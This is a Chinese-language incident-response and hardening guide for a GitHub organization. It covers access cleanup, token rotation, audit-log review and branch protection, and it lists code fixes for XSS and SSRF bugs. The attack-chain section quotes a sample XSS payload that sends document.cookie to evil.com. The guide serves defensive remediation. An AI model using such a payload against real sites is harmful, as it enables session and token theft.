# FrostEditor GitHub 组织安全加固指南

> 背景：有人无视权限进入仓库甚至获得所有者身份。本指南分「紧急处置」和「长期加固」两部分。
> 本机没有 `gh` CLI / token，以下操作请在 GitHub 网页执行。

---

## 一、紧急处置（立刻做，止血）

### 1. 移除未授权成员 / 降级权限
打开 `https://github.com/orgs/FrostEditor/people`：
- 逐个审查所有成员，**移除**任何你不认识的账号。
- 检查每个成员的 **Role**：`Owner` 只应给你自己和绝对信任的人。
  把不需要管理权限的人降为 `Member`。
- 注意：被移除的 owner 如果是通过**团队**继承的权限，还需要去
  `orgs/FrostEditor/teams` 检查团队角色。

### 2. 审查仓库协作者（组织级 + 仓库级）
- 组织级：`orgs/FrostEditor/people`（上一步）。
- 仓库级：逐个仓库 → Settings → Collaborators and teams。
  - `scratch-gui`、`extensions`、`desktop` 等核心仓库尤其要查。
  - 移除可疑的 Direct access 协作者。
  - 检查 Team 权限：`Admin`/`Maintain` 权限只给必要团队。

### 3. 轮换所有令牌 / 密钥
入侵者可能已经窃取了令牌。**全部轮换**：
- **Personal Access Tokens**：`github.com/settings/tokens` → 删除所有旧 token，按需重建。
- **Deploy Keys**：每个仓库 → Settings → Deploy keys → 删除所有旧 key，重建。
- **GitHub Actions Secrets**：每个仓库 → Settings → Secrets and variables → Actions → 轮换所有密钥（特别是 `CLOUDFLARE_API_TOKEN`、`GH_TOKEN` 等）。
- **Cloudflare API Token**：去 Cloudflare Dashboard → My Profile → API Tokens → 删除旧 token 重建（你的 Pages 部署用的是它）。
- **Git credential helper**：本机 `git config credential.helper` 指向 git-credential-manager，登录凭据存在 Windows 凭据管理器。运行 `cmdkey /list:git:*` 查看并清除旧的 GitHub 凭据。

### 4. 审查 Audit Log（找出入侵痕迹）
打开 `orgs/FrostEditor/settings/audit_log`（需要组织 owner 权限）：
- 搜索 `action:org.add_member` — 查谁加了人。
- 搜索 `action:member.promote` — 查谁被提升为 owner。
- 搜索 `action:repo.create` / `action:repo.change_visibility` — 查可疑仓库变动。
- 搜索 `action:oauth_app.access` — 查 OAuth app 授权。
- 把可疑操作的 IP、时间、操作者记下来。

### 5. 检查 OAuth App / GitHub App 授权
- 组织级：`orgs/FrostEditor/settings/oauth_applications` — 撤销不认识的 app。
- 个人级：`github.com/settings/applications` — 同上。
- 入侵者可能通过恶意 OAuth app 获得持续访问权限。

### 6. 审查最近提交 / Release
- 入侵者可能已植入恶意代码。检查每个仓库最近的 commit：
  `github.com/FrostEditor/scratch-gui/commits/develop`
- **重点检查 Release**：`github.com/FrostEditor/scratch-gui/releases` —
  如果有可疑 Release，其 body 可能含 XSS payload（已通过本次修复的
  update-modal 漏洞被阻断，但仍应删除恶意 Release）。
- 用 `git log --all --oneline --since="2026-07-01"` 在本地查异常提交。

---

## 二、长期加固（防再次入侵）

### 7. 强制双因素认证（2FA）
`orgs/FrostEditor/settings/security`：
- 开启 **Require two-factor authentication for everyone in the organization**。
- 这会让没开 2FA 的成员被自动移除。

### 8. 限制组织角色权限
`orgs/FrostEditor/settings/member_privileges`：
- **Member privileges** → 设为最严格（成员默认不能创建仓库、不能改可见性）。
- **Default repository permission** → `Read`（而非 Write）。
- **Repository creation** → 关闭（或仅 admin）。
- **Repository forking** → 关闭。
- **Repository deletion/transfer** → 仅 owner。

### 9. 分支保护规则（关键！）
每个核心仓库 → Settings → Branches → Branch protection rules：
- `develop`（生产分支）和 `main` 加保护：
  - ✅ Require pull request before merging
  - ✅ Require approvals（至少 1-2 个）
  - ✅ Require status checks to pass before merging（CI 构建）
  - ✅ Require branches to be up to date
  - ✅ Do not allow bypassing the above settings
  - ✅ Restrict who can push to matching branches（仅 admin/owner）
- 这能阻止任何人直接 push 到生产分支。

### 10. 限制 GitHub Actions 令牌权限
每个仓库 → Settings → Actions → General：
- **Workflow permissions** → `Read repository contents permission`（而非 Read and write）。
- 只在需要的单独 job 里用 `permissions: contents: write` 显式提权。
- **Approval for running fork pull request workflows** → 开启。

### 11. 开启推送保护（Secret Scanning）
每个仓库 → Settings → Code security：
- ✅ Enable secret scanning
- ✅ Enable push protection（阻止含密钥的提交被推送）

### 12. 定期审计
- 每月查一次 `orgs/FrostEditor/people` 和各仓库 Collaborators。
- 每月查一次 audit log。
- 考虑用 `gh` CLI 脚本化审计（装 `gh` 后可自动化）。

---

## 三、本次代码层面安全修复（已完成）

| # | 漏洞 | 严重性 | 修复 | 文件 |
|---|------|--------|------|------|
| 1 | update-modal `dangerouslySetInnerHTML` XSS：Release body 零转义直渲染 | 🔴 严重 | parseMarkdown 先 HTML 转义再套 markdown；链接 href 做协议白名单（仅 http/https/mailto） | src/components/tw-update-modal/update-modal.jsx |
| 2 | 代理重定向 SSRF 绕过：isBlockedHost 只查初始 URL，重定向不复查 | 🟡 中危 | 重定向目标也过 isBlockedHost | src/lib/tw-cors-proxy.js、functions/proxy.js、desktop/src-main/protocols.js |
| 3 | 无 CSP，XSS 突破后无第二道防线 | 🟡 中危 | 加 `object-src 'none'; base-uri 'self'` 到所有 HTML 模板 | src/playground/{index,embed,simple}.ejs |

### XSS 漏洞利用链（已阻断）
```
攻击者获得仓库权限
  → 编辑 GitHub Release，body 塞 <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
  → 用户打开 FrostEditor，更新检测拉取 release.body
  → update-modal 用 dangerouslySetInnerHTML 渲染 body
  → onerror 执行 → 窃取 forum token / localStorage 数据
```
修复后：所有 HTML 实体先转义，`<img>` 变成纯文本显示，攻击无效。

### 仍需注意
- `script-src` 严格 CSP 需把 index.ejs 的内联 splash 脚本外置化才能上（当前用安全子集 CSP 兜底）。
- 代理的 DNS rebinding 防护（域名解析到内网 IP）仍是 hostname 级检查的固有局限，生产环境建议加 Cloudflare 的 SSRF 防护或出口防火墙。
- `security-scan.js` 已覆盖 node_modules 供应链投毒（含 2026-07 scratch-paint 事件签名）和 github: 依赖完整性校验。
